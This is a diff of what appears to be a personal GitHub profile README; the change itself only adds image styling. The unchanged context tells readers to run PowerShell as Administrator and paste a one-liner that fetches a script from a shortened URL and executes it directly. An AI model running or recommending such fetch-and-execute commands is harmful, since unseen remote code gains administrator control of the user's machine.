@@ -29,7 +29,7 @@ Welcome to my GitHub profile! Here’s an overview of my stats and activity.
     <h2>Try my Windows Utility tool</h2>
 </div>
 <p align="center">
-    <img src="utility.png" alt="Utility Tool Logo">
+    <img src="utility.png" alt="Utility Tool Logo" style="width: 99%; border-radius: 5px;">
     <p>Run PowerShell as Administrator and copy the code and paste it to your PS:    <span onclick="copyToClipboard(this)" style="cursor: pointer; color: green; padding: 5px; border-radius: 4px; text-decoration: underline;">
            irm tinyurl.com/mrkwinutil | iex
     </span></p>
